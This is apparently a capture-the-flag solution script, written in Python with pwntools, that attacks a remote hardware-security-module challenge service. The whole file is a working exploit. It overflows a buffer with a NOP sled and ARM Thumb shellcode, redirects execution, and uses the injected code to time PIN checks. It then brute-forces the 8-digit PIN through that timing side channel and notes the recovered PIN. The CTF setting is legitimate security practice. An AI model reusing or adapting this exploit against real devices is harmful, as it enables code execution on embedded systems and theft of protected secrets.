#!/usr/bin/python
from pwn import *

context(arch='thumb')

served = 0x08000724
stack = 0x20002000
flag = 0x08001268

hsm = 0x20000000
usart_flush = 0x080008ee # r0 = hsm
usart_tx = 0x080008fa # r0 = hsm, r1 = cmd (1=verify pin)
usart_tx_buf = 0x0800091c # r0 = hsm, r1 = buf, r2 = len
socket_print = 0x08001038 # r0 = socket, r1 = msg

call_usart_flush = '\n'.join([
  'mov r0, r4', # hsm
  'mov r3, 0x%x + 1' % (usart_flush & 0xffff),
  'movt r3, 0x%x' % (usart_flush >> 16),
  'blx r3',
])
call_usart_tx = '\n'.join([
  'mov r0, r4', # hsm
  'mov r1, 1', # cmd: verify_pin
  'mov r3, 0x%x + 1' % (usart_tx & 0xffff),
  'movt r3, 0x%x' % (usart_tx >> 16),
  'blx r3',
])
call_usart_tx_buf = '\n'.join([
  'mov r0, r4', # hsm
  'mov r1, r5', # buf
  'mov r2, 8', # len
  'mov r3, 0x%x + 1' % (usart_tx_buf & 0xffff),
  'movt r3, 0x%x' % (usart_tx_buf >> 16),
  'blx r3',
])
call_usart_rx = '\n'.join([
  'mov r0, 0',
  'ldr r3, [r4, 4]',
  'loop:',
  'add r0, 1',
  'ldr r1, [r3, 0x100]',
  'ldr r2, [r3, 0x104]',
  'cmp r1, r2',
  'beq loop',
  'ldr.w r2, [r3, 0x104]',
  'add r2, 1',
  'str.w r2, [r3, 0x104]',
])
call_socket_print = '\n'.join([
  'mov r0, r6', # socket
  'mov r1, r5', # msg
  'mov r3, 0x%x + 1' % (socket_print & 0xffff),
  'movt r3, 0x%x' % (socket_print >> 16),
  'blx r3',
])

def time_character_retry(prefix, character):
  while True:
    try:
      return time_character(prefix, character)
    except EOFError as e:
      print('Exception: %s' % e)
      continue

def time_character(prefix, character):
  code = [
    'mov r6, sp',
    'sub sp, 0x1000',

    'mov r5, sp', # buf

    'mov r4, 0x%x' % (hsm & 0xffff),
    'movt r4, 0x%x' % (hsm >> 16),
  ]
  i = 0
  for c in prefix:
    code += [
      'mov r1, 0x%x' % ord(c),
      'strb r1, [r5, %i]' % i,
    ]
    i += 1
  code += [
    'mov r1, 0x%x' % ord(character),
    'strb r1, [r5, %i]' % i,
    call_usart_flush,
    call_usart_tx,
    call_usart_tx_buf,
    call_usart_rx,
    'str r0, [r5]',
    call_socket_print,

    'add sp, 0x1000',
    'mov r0, 0x%x + 1' % (served & 0xffff),
    'movt r0, 0x%x' % (served >> 16),
    'bx r0',
  ]

  shellcode = asm('\n'.join(code))
  assert len(shellcode) % 2 == 0
  cmd = b'help\n '
  assert len(cmd) % 2 == 0
  nop = asm('nop')
  assert len(nop) == 2
  prefix = cmd + nop * int((0x300 - len(cmd) - len(shellcode)) / 2) + shellcode
  assert len(prefix) == 0x300
  payload = prefix + p32(0) + p32(stack - 0x300 + 1)
  assert len(payload) <= 0x400
  p = remote('picohsm.donjon-ctf.io', 8009)
  p.recvuntil('Timeout in 15 seconds...')
  p.send(payload)
  p.recvuntil('decrypt [PIN] [KEYID] [HEX] - decrypt a data blob.\n')
  timing = p.recv(1)
  p.close()
  return ord(timing)

prefix = ''
while len(prefix) != 8:
  results = []
  for c in '0123456789':
    t = time_character_retry(prefix, c)
    print('%s = %i' % (c, t))
    results += [(c, t)]
  results = sorted(results, key=lambda r: r[1], reverse=True)
  print(results)
  prefix += results[0][0]
  print("found: %s" % prefix)

# 13372020
